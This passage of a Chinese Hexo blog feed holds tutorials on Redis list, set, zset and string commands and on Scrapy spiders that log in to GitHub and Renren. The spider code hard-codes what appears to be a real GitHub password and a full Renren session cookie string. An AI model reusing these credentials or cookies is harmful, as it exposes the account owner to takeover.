<li>从左侧插入数据，创建列表<br>语法：<code>lpush list item1 item2</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; lpush list1 one two three</span><br><span class="line">(integer) 3</span><br><span class="line">127.0.0.1:6379&gt; type list1 #查看列表的数据类型</span><br><span class="line">list</span><br><span class="line">127.0.0.1:6379&gt; lrange list1 0 2 #查看列表的元素</span><br><span class="line">1) &quot;three&quot;</span><br><span class="line">2) &quot;two&quot;</span><br><span class="line">3) &quot;one&quot;</span><br></pre></td></tr></table></figure></li>
<li>从右侧插入数据，创建列表<br>语法：<code>rpush list item1 item2</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; rpush list2 one two three</span><br><span class="line">(integer) 3</span><br><span class="line">127.0.0.1:6379&gt; lrange list2 0 2 #查看列表的元素</span><br><span class="line">1) &quot;one&quot;</span><br><span class="line">2) &quot;two&quot;</span><br><span class="line">3) &quot;three&quot;</span><br></pre></td></tr></table></figure>
<h2 id="插入数据到列表"><a href="#插入数据到列表" class="headerlink" title="插入数据到列表"></a>插入数据到列表</h2>语法：<code>linsert list before/after item item_changed</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; linsert list1 before two 2 #向列表list1的元素&quot;two&quot;之前插入元素&quot;2&quot;</span><br><span class="line">(integer) 4</span><br><span class="line">127.0.0.1:6379&gt; lrange list1 0 3 #查看列表的元素</span><br><span class="line">1) &quot;three&quot;</span><br><span class="line">2) &quot;2&quot;</span><br><span class="line">3) &quot;two&quot;</span><br><span class="line">4) &quot;one&quot;</span><br></pre></td></tr></table></figure>
<h2 id="查看列表元素"><a href="#查看列表元素" class="headerlink" title="查看列表元素"></a>查看列表元素</h2>语法：<code>lrange list index1 index2</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; lrange list1 0 -1 #查看列表的所有元素，索引值为-1表示最后一个元素</span><br><span class="line">1) &quot;three&quot;</span><br><span class="line">2) &quot;2&quot;</span><br><span class="line">3) &quot;two&quot;</span><br><span class="line">4) &quot;one&quot;</span><br></pre></td></tr></table></figure>
<h2 id="修改列表元素的值"><a href="#修改列表元素的值" class="headerlink" title="修改列表元素的值"></a>修改列表元素的值</h2>语法：<code>lset list index item</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; lrange list1 0 -1</span><br><span class="line">1) &quot;three&quot;</span><br><span class="line">2) &quot;2&quot;</span><br><span class="line">3) &quot;two&quot;</span><br><span class="line">4) &quot;one&quot;</span><br><span class="line">127.0.0.1:6379&gt; lset list1 1 change #将索引值为1的元素值改为&quot;change&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; lrange list1 0 -1</span><br><span class="line">1) &quot;three&quot;</span><br><span class="line">2) &quot;change&quot;</span><br><span class="line">3) &quot;two&quot;</span><br><span class="line">4) &quot;one&quot;</span><br></pre></td></tr></table></figure>
<h2 id="删除列表元素"><a href="#删除列表元素" class="headerlink" title="删除列表元素"></a>删除列表元素</h2>语法：<code>lrem list count item</code><br>count的值大于0，表示从左侧开始删除值为item的元素。<br>count的值小于0，表示从右侧开始删除值为item的元素。<br>count的值等于0，表示删除所有值为item的元素。<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; lrange list1 0 -1</span><br><span class="line"> 1) &quot;b&quot;</span><br><span class="line"> 2) &quot;a&quot;</span><br><span class="line"> 3) &quot;b&quot;</span><br><span class="line"> 4) &quot;a&quot;</span><br><span class="line"> 5) &quot;b&quot;</span><br><span class="line"> 6) &quot;a&quot;</span><br><span class="line"> 7) &quot;three&quot;</span><br><span class="line"> 8) &quot;change&quot;</span><br><span class="line"> 9) &quot;two&quot;</span><br><span class="line">10) &quot;one&quot;</span><br><span class="line">127.0.0.1:6379&gt; lrem list1 -2 b #从右侧删除list1的两个值为&quot;b&quot;的元素</span><br><span class="line">(integer) 2</span><br><span class="line">127.0.0.1:6379&gt; lrange list1 0 -1</span><br><span class="line">1) &quot;b&quot;</span><br><span class="line">2) &quot;a&quot;</span><br><span class="line">3) &quot;a&quot;</span><br><span class="line">4) &quot;a&quot;</span><br><span class="line">5) &quot;three&quot;</span><br><span class="line">6) &quot;change&quot;</span><br><span class="line">7) &quot;two&quot;</span><br><span class="line">8) &quot;one&quot;</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>redis数据库</category>
      </categories>
      <tags>
        <tag>redis数据类型</tag>
        <tag>list命令</tag>
      </tags>
  </entry>
  <entry>
    <title>redis数据类型之set和zset命令</title>
    <url>//posts/ZH-CN/Redis_Set_Zset.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>set是无序集合，而zset是有序集合。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="set无序集合"><a href="#set无序集合" class="headerlink" title="set无序集合"></a>set无序集合</h2><ul>
<li>创建无序集合<br>语法：<code>sadd key value1 value2</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; sadd myset 1 2 3 #创建无序集合myset</span><br><span class="line">(integer) 3</span><br><span class="line">127.0.0.1:6379&gt; smembers myset #获取无序集合myset的所有元素</span><br><span class="line">1) &quot;1&quot;</span><br><span class="line">2) &quot;2&quot;</span><br><span class="line">3) &quot;3&quot;</span><br></pre></td></tr></table></figure></li>
<li>查看是否存在某个元素<br>语法：<code>sismember key item</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; sismember myset 3 #查看myset集合中是否存在元素&quot;3&quot;，存在则返回1</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; sismember myset 5 #查看myset集合中是否存在元素&quot;5&quot;，不存在则返回0</span><br><span class="line">(integer) 0</span><br></pre></td></tr></table></figure></li>
<li>删除指定元素<br>语法：<code>srem key item</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; srem myset 2 #删除myset集合中的元素&quot;2&quot;</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; smembers myset #查询myset集合中的所有元素</span><br><span class="line">1) &quot;1&quot;</span><br><span class="line">2) &quot;3&quot;</span><br></pre></td></tr></table></figure>
<h2 id="zset有序集合"><a href="#zset有序集合" class="headerlink" title="zset有序集合"></a>zset有序集合</h2></li>
<li>创建有序集合<br>语法：<code>zadd key weight_num1 item1 weight_num2 item2</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; zadd union 4 lisi 5 wangwu 6 zhangsan 3 zhaoliu #创建有序集合union，集合的元素包括：lisi、wangwu、zhangsan、zhaoliu</span><br><span class="line">(integer) 4</span><br><span class="line">127.0.0.1:6379&gt; type union #查看有序集合的数据类型</span><br><span class="line">zset</span><br></pre></td></tr></table></figure></li>
<li>查看有序集合的元素<br>语法：<code>zrange key index1 index2</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; zrange union 0 -1</span><br><span class="line">1) &quot;zhaoliu&quot;</span><br><span class="line">2) &quot;lisi&quot;</span><br><span class="line">3) &quot;wangwu&quot;</span><br><span class="line">4) &quot;zhangsan&quot;</span><br></pre></td></tr></table></figure></li>
<li>查看权重范围内的元素<br>语法：<code>zrangebyscore key weight_num1 weight_num2</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; zrangebyscore union 3 5 #查询union集合中，权重值在[3,5]这个区间的元素</span><br><span class="line">1) &quot;zhaoliu&quot;</span><br><span class="line">2) &quot;lisi&quot;</span><br><span class="line">3) &quot;wangwu&quot;</span><br></pre></td></tr></table></figure></li>
<li>查看某个元素的权重值<br>语法：<code>zscore key item</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; zscore union zhangsan #查看union集合中，&quot;zhangsan&quot;这个元素的权重值</span><br><span class="line">&quot;6&quot;</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>redis数据库</category>
      </categories>
      <tags>
        <tag>redis数据类型</tag>
        <tag>set和zset命令</tag>
      </tags>
  </entry>
  <entry>
    <title>scrapy爬虫实例之发送post请求登录github</title>
    <url>//posts/ZH-CN/Scrapy_Spider_Post_Github.html</url>
    <content><![CDATA[<h2 id="爬什么"><a href="#爬什么" class="headerlink" title="爬什么"></a>爬什么</h2><p>使用scrapy发送post请求登录到<a href="https://github.com/">github</a>。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>github登录的过程是这样：</p>
<ol>
<li>发送这条get请求<a href="https://github.com/login，获取到登录请求的post数据">https://github.com/login，获取到登录请求的post数据</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6bf4aotbj31f60u0aer.jpg" alt="image.png"></li>
<li>用第一步获取的post数据，发送post请求<a href="https://github.com/session。">https://github.com/session。</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6bhuzlqlj31f60u0jv7.jpg" alt="image.png"></li>
</ol>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>github.py：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GithubSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;github&#x27;</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;github.com&#x27;</span>]</span><br><span class="line">    start_urls = [<span class="string">&#x27;https://github.com/login&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self,response</span>):</span></span><br><span class="line">        authenticity_token = response.xpath(<span class="string">&quot;//input[@name=&#x27;authenticity_token&#x27;]/@value&quot;</span>).extract_first() <span class="comment">#获取登录请求所需的post数据</span></span><br><span class="line">        utf8 = response.xpath(<span class="string">&quot;//input[@name=&#x27;utf8&#x27;]/@value&quot;</span>).extract_first()</span><br><span class="line">        commit = response.xpath(<span class="string">&quot;//input[@name=&#x27;commit&#x27;]/@value&quot;</span>).extract_first()</span><br><span class="line">        timestamp = response.xpath(<span class="string">&quot;//input[@name=&#x27;timestamp&#x27;]/@value&quot;</span>).extract_first()</span><br><span class="line">        timestamp_secret = response.xpath(<span class="string">&quot;//input[@name=&#x27;timestamp_secret&#x27;]/@value&quot;</span>).extract_first()</span><br><span class="line"></span><br><span class="line">        post_data = &#123; <span class="comment">#post数据体，字典类型</span></span><br><span class="line">            <span class="string">&#x27;login&#x27;</span>: <span class="string">&#x27;xiaokunjia&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1070710263xkj&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;authenticity_token&#x27;</span>: authenticity_token,</span><br><span class="line">            <span class="string">&#x27;utf8&#x27;</span>: utf8,</span><br><span class="line">            <span class="string">&#x27;commit&#x27;</span>: commit,</span><br><span class="line">            <span class="string">&#x27;timestamp&#x27;</span>: timestamp,</span><br><span class="line">            <span class="string">&#x27;timestamp_secret&#x27;</span>: timestamp_secret,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">yield</span> scrapy.FormRequest( <span class="comment">#使用scrapy.FormRequest提交post表单请求</span></span><br><span class="line">            <span class="string">&quot;https://github.com/session&quot;</span>, <span class="comment">#post请求的url</span></span><br><span class="line">            formdata=post_data, <span class="comment">#post数据体</span></span><br><span class="line">            callback=self.after_login <span class="comment">#对post请求的响应内容做数据处理</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">after_login</span>(<span class="params">self,response</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(re.findall(<span class="string">&quot;xiaokunjia&quot;</span>,response.body.decode())) <span class="comment">#从post请求的响应html中查找是否存在&quot;xiaokunjia&quot;这一字符串。如果存在，则说明我们发送的post请求成功获取响应</span></span><br></pre></td></tr></table></figure>
<p>settings.py：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Scrapy settings for postlogin project</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For simplicity, this file contains only settings considered important or</span></span><br><span class="line"><span class="comment"># commonly used. You can find more settings consulting the documentation:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/settings.html</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"></span><br><span class="line">BOT_NAME = <span class="string">&#x27;postlogin&#x27;</span></span><br><span class="line"></span><br><span class="line">SPIDER_MODULES = [<span class="string">&#x27;postlogin.spiders&#x27;</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">&#x27;postlogin.spiders&#x27;</span></span><br><span class="line"></span><br><span class="line">LOG_LEVEL = <span class="string">&#x27;WARNING&#x27;</span></span><br><span class="line"><span class="comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span></span><br><span class="line">USER_AGENT = <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36&#x27;</span> <span class="comment">#这里必须设置USER_AGENT，否则scrapy爬取失败</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Obey robots.txt rules</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure maximum concurrent requests performed by Scrapy (default: 16)</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS = 32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure a delay for requests for the same website (default: 0)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/settings.html#download-delay</span></span><br><span class="line"><span class="comment"># See also autothrottle settings and docs</span></span><br><span class="line"><span class="comment">#DOWNLOAD_DELAY = 3</span></span><br><span class="line"><span class="comment"># The download delay setting will honor only one of:</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS_PER_DOMAIN = 16</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS_PER_IP = 16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable cookies (enabled by default)</span></span><br><span class="line"><span class="comment">#COOKIES_ENABLED = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable Telnet Console (enabled by default)</span></span><br><span class="line"><span class="comment">#TELNETCONSOLE_ENABLED = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Override the default request headers:</span></span><br><span class="line"><span class="comment"># DEFAULT_REQUEST_HEADERS = &#123;</span></span><br><span class="line"><span class="comment">#   &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;Accept-Language&#x27;: &#x27;en&#x27;,</span></span><br><span class="line"><span class="comment">#   # &#x27;referer&#x27;:&#x27;https://github.com&#x27;,</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable spider middlewares</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"><span class="comment">#SPIDER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;postlogin.middlewares.PostloginSpiderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable downloader middlewares</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment">#DOWNLOADER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;postlogin.middlewares.PostloginDownloaderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable extensions</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/extensions.html</span></span><br><span class="line"><span class="comment">#EXTENSIONS = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;scrapy.extensions.telnet.TelnetConsole&#x27;: None,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure item pipelines</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line"><span class="comment">#ITEM_PIPELINES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;postlogin.pipelines.PostloginPipeline&#x27;: 300,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable and configure the AutoThrottle extension (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/autothrottle.html</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_ENABLED = True</span></span><br><span class="line"><span class="comment"># The initial download delay</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_START_DELAY = 5</span></span><br><span class="line"><span class="comment"># The maximum download delay to be set in case of high latencies</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_MAX_DELAY = 60</span></span><br><span class="line"><span class="comment"># The average number of requests Scrapy should be sending in parallel to</span></span><br><span class="line"><span class="comment"># each remote server</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0</span></span><br><span class="line"><span class="comment"># Enable showing throttling stats for every response received:</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_DEBUG = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable and configure HTTP caching (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings</span></span><br><span class="line"><span class="comment">#HTTPCACHE_ENABLED = True</span></span><br><span class="line"><span class="comment">#HTTPCACHE_EXPIRATION_SECS = 0</span></span><br><span class="line"><span class="comment">#HTTPCACHE_DIR = &#x27;httpcache&#x27;</span></span><br><span class="line"><span class="comment">#HTTPCACHE_IGNORE_HTTP_CODES = []</span></span><br><span class="line"><span class="comment">#HTTPCACHE_STORAGE = &#x27;scrapy.extensions.httpcache.FilesystemCacheStorage&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="爬取结果"><a href="#爬取结果" class="headerlink" title="爬取结果"></a>爬取结果</h2><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6bnksvjuj31f1053mxy.jpg" alt="image.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一需要确认的是待爬取的链接，能不能获取到响应html。如果获取不到响应html，原因可能是因为没有设置USER_AGENT。这个例子就是必须要设置USER_AGENT，否则scrapy爬取不到数据。<br><code>timestamp = response.xpath(&quot;//input[@name=&#39;timestamp&#39;]/@value&quot;).extract_first()</code>通过xpath语句提取所需的post数据，记住要加上<code>.extract_first()</code>。<br>scrapy发送post请求的方式：<code>scrapy.FormRequest</code>。用法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">yield</span> scrapy.FormRequest( <span class="comment">#使用scrapy.FormRequest提交post表单请求</span></span><br><span class="line">            <span class="string">&quot;https://github.com/session&quot;</span>, <span class="comment">#post请求的url</span></span><br><span class="line">            formdata=post_data, <span class="comment">#post数据体，字典类型</span></span><br><span class="line">            callback=self.after_login <span class="comment">#对post请求的响应内容做数据处理</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure>
<h2 id="拓展-自动获取登录之后的url"><a href="#拓展-自动获取登录之后的url" class="headerlink" title="拓展-自动获取登录之后的url"></a>拓展-自动获取登录之后的url</h2><p><code>scrapy.FormRequest.from_response</code>可以自动从登录请求的响应html中提取form表单的action跳转地址。意思就是这个方式可以直接获取到登录之后的url地址。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6c2t0vc2j31f60u0436.jpg" alt="image.png"><br>用法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">yield</span> scrapy.FormRequest.from_response(</span><br><span class="line">            response, <span class="comment">#这里可以直接获取到form表单的action地址，即https://github.com/session</span></span><br><span class="line">            formdata=post_data,</span><br><span class="line">            callback=self.after_login</span><br><span class="line">        )</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>python爬虫实例</category>
        <category>scrapy框架爬虫</category>
      </categories>
      <tags>
        <tag>scrapy爬虫实例</tag>
        <tag>发送post请求登录github</tag>
      </tags>
  </entry>
  <entry>
    <title>redis数据类型之string和键命令</title>
    <url>//posts/ZH-CN/Redis_String_Key.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>redis数据库装好之后，我们练习一下数据库的常用操作。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="设置string类型的键值"><a href="#设置string类型的键值" class="headerlink" title="设置string类型的键值"></a>设置string类型的键值</h2><ul>
<li>设置单个键值<br>语法：<code>set key value</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set name dana #设置键值name:dana</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get name #获取name键的值</span><br><span class="line">&quot;dana&quot;</span><br></pre></td></tr></table></figure></li>
<li>设置多个键值<br>语法：<code>mset key1 value1 key2 value2</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; mset name dana age 23 #设置多个键值</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; mget name age #获取多个键的值</span><br><span class="line">1) &quot;dana&quot;</span><br><span class="line">2) &quot;23&quot;</span><br></pre></td></tr></table></figure></li>
<li>设置键的过期时间<br>语法：<code>setex key expire_time value</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; setex test 3 expire #设置test键值的同时，设置键的过期时间为3秒</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get test #3秒之后，这个键已经过期了</span><br><span class="line">(nil)</span><br></pre></td></tr></table></figure></li>
<li>追加键值的内容<br>语法：<code>append key value</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; append name shaw #给name键的值，追加shaw这个字符串</span><br><span class="line">(integer) 8</span><br><span class="line">127.0.0.1:6379&gt; get name #name键的值已更改</span><br><span class="line">&quot;danashaw&quot;</span><br></pre></td></tr></table></figure>
<h2 id="键命令"><a href="#键命令" class="headerlink" title="键命令"></a>键命令</h2></li>
<li>查询键（模糊匹配）<br>语法：<code>keys a*</code>（查询以a开头的键）<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; keys a*</span><br><span class="line">1) &quot;age&quot;</span><br></pre></td></tr></table></figure></li>
<li>查询所有键<br>语法：<code>keys *</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) &quot;score&quot;</span><br><span class="line">2) &quot;name&quot;</span><br></pre></td></tr></table></figure></li>
<li>查询键是否存在<br>语法：<code>exists key</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; exists AGE #AGE键不存在，返回0</span><br><span class="line">(integer) 0</span><br><span class="line">127.0.0.1:6379&gt; exists age #age键存在，返回1</span><br><span class="line">(integer) 1</span><br></pre></td></tr></table></figure></li>
<li>查询键值的数据类型<br>语法：<code>type key</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; type name</span><br><span class="line">string</span><br></pre></td></tr></table></figure></li>
<li>设置键的过期时间<br>语法：<code>expire key expire_time</code><br>注意，这是对已存在的键进行的操作。<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; expire name 3 #设置name键的过期时间为3秒</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; get name</span><br><span class="line">&quot;dana&quot;</span><br><span class="line">127.0.0.1:6379&gt; get name #3秒之后，name键已过期</span><br><span class="line">(nil)</span><br></pre></td></tr></table></figure></li>
<li>删除键<br>语法：<code>del key1 key2</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; del score name</span><br><span class="line">(integer) 2</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty list or set)</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>redis数据库</category>
      </categories>
      <tags>
        <tag>redis数据类型</tag>
        <tag>string</tag>
        <tag>键命令</tag>
      </tags>
  </entry>
  <entry>
    <title>scrapy爬虫实例之携带cookie登录人人网</title>
    <url>//posts/ZH-CN/Scrapy_Spider_Cookie_Renren.html</url>
    <content><![CDATA[<h2 id="爬什么"><a href="#爬什么" class="headerlink" title="爬什么"></a>爬什么</h2><p>爬取<a href="http://www.renren.com/">人人网</a>的个人档案页面。由于这个页面是登录之后才能够访问的，我们爬虫的时候必须要携带cookie。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>使用了spider自带的一个功能函数<code>start_requests(self)</code>，使用<code>yield</code>带上cookies发起请求。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc4ffy5zwbj31f60u0jx7.jpg" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_requests</span>(<span class="params">self</span>):</span></span><br><span class="line">    cookies = <span class="string">&quot;anonymid=k5jjy9gb-p4f3be; _r01_=1; taihe_bi_sdk_uid=41402119b11006539defa847b6465809; jebe_key=538aac78-0044-476f-980c-0e53071b02d6%7C42d7b478811716336baa94c4523e9833%7C1579351511075%7C1%7C1579351510138; __utma=151146938.1215165037.1579351626.1579351626.1579351626.1; __utmz=151146938.1579351626.1.1.utmcsr=mail.qq.com|utmccn=(referral)|utmcmd=referral|utmcct=/; _de=04F2D88119EA2B63E16F2C7283EEE4526DEBB8C2103DE356; depovince=GW; jebecookies=34dc0299-7196-4cfd-a488-2bc049b14d0c|||||; JSESSIONID=abcMtuJJwHUBCaBrWmObx; ick_login=29877d8a-34a7-4d2c-bb52-a247fb308dae; taihe_bi_sdk_session=97aeb76cc7bd9c0c4fe9d7c6dcfb5eed; p=bde487db3148887ef533de31e99862b30; first_login_flag=1; ln_uact=3321647547@qq.com; ln_hurl=http://hdn.xnimg.cn/photos/hdn221/20200118/2045/h_main_TCCN_9c6c00011d14195a.jpg; t=de1623c5b5c112750032f096cc552d6d0; societyguester=de1623c5b5c112750032f096cc552d6d0; id=973482150; xnsid=97c70d4d; ver=7.0; loginfrom=null; wp_fold=0; jebe_key=538aac78-0044-476f-980c-0e53071b02d6%7C42d7b478811716336baa94c4523e9833%7C1582296534360%7C1%7C1582296533331&quot;</span></span><br><span class="line">    cookies = &#123;i.split(<span class="string">&quot;=&quot;</span>)[<span class="number">0</span>]:i.split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> cookies.split(<span class="string">&quot;; &quot;</span>)&#125; <span class="comment">#将cookies转化为字典</span></span><br><span class="line">    <span class="keyword">yield</span> scrapy.Request(</span><br><span class="line">        self.start_urls[<span class="number">0</span>],</span><br><span class="line">        callback=self.parse,</span><br><span class="line">        cookies=cookies</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>renren.py：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RenrenSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;renren&#x27;</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;renren.com&#x27;</span>]</span><br><span class="line">    start_urls = [<span class="string">&#x27;http://www.renren.com/973482150/profile&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_requests</span>(<span class="params">self</span>):</span></span><br><span class="line">        cookies = <span class="string">&quot;anonymid=k5jjy9gb-p4f3be; _r01_=1; taihe_bi_sdk_uid=41402119b11006539defa847b6465809; jebe_key=538aac78-0044-476f-980c-0e53071b02d6%7C42d7b478811716336baa94c4523e9833%7C1579351511075%7C1%7C1579351510138; __utma=151146938.1215165037.1579351626.1579351626.1579351626.1; __utmz=151146938.1579351626.1.1.utmcsr=mail.qq.com|utmccn=(referral)|utmcmd=referral|utmcct=/; _de=04F2D88119EA2B63E16F2C7283EEE4526DEBB8C2103DE356; depovince=GW; jebecookies=34dc0299-7196-4cfd-a488-2bc049b14d0c|||||; JSESSIONID=abcMtuJJwHUBCaBrWmObx; ick_login=29877d8a-34a7-4d2c-bb52-a247fb308dae; 